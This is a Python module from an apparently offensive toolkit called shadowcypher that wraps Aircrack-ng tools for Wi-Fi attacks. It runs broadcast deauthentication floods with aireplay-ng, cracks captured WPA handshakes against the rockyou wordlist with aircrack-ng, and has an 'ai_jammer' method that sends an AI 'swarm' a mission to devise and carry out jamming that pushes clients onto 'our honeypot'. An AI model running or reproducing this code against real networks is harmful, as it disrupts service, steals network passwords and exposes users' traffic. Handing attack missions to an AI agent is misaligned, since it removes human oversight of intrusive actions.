"""
Wireless Module — Apex Intelligence Build.
Handles Aircrack-ng suite integration, WPA/WPA2 audits, and deauth attacks.
"""

from shadowcypher.core.module import BaseModule
from shadowcypher.core.sanitize import validate_interface

class Wireless(BaseModule):
    """The 'Wave' engine for wireless auditing."""
    
    def __init__(self):
        super().__init__(module_name="wireless")

    def _check_iface(self, iface):
        if not validate_interface(iface):
            self.log(f"INVALID_INTERFACE: {iface}", "ERROR")
            return False
        return True

    def scan_wifi(self, interface, on_output=None):
        if not self._check_iface(interface): return
        self.log(f"INITIATING_WIFI_SCAN: {interface}")
        
        # Using airodump-ng or similar
        return self.execute(f"SCAN_{interface}", ["airodump-ng", interface], callback=on_output)

    def deauth_target(self, interface, bssid, client_mac="FF:FF:FF:FF:FF:FF", on_output=None):
        if not self._check_iface(interface): return
        self.log(f"DEAUTH_ATTACK: {bssid} -> {client_mac}")
        
        args = ["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, interface]
        return self.execute("DEAUTH", args, callback=on_output)

    def crack_wpa(self, cap_file, wordlist=None, on_output=None):
        wordlist = wordlist or self.get_tool_path("rockyou")
        self.log(f"CRACKING_WPA_HANDSHAKE: {cap_file}")
        
        args = ["aircrack-ng", "-w", wordlist, cap_file]
        return self.execute("WPA_CRACK", args, callback=on_output)

    def ai_jammer(self, bssid, on_output=None):
        """Escalate to Swarm for complex signal-jamming strategies."""
        from shadowcypher.core.hub import hub
        self.log(f"AI_JAMMER_STRATEGY_INIT: {bssid}", "AI")
        return hub.register_mission(f"Devise and execute a smart deauth/jamming strategy for AP {bssid} to force clients to our honeypot.")
